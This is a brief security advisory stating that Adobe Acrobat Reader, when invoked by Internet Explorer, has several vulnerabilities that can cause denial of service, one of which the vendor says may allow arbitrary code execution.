Adobe Acrobat is prone to multiple vulnerabilities. These errors have been confirmed to occur when Reader is invoked by Internet Explorer; other occurrences may exist.

Attackers can exploit these issues to cause denial-of-service conditions on a victim computer.

The vendor has confirmed that one of these issues may lead to arbitrary code execution.
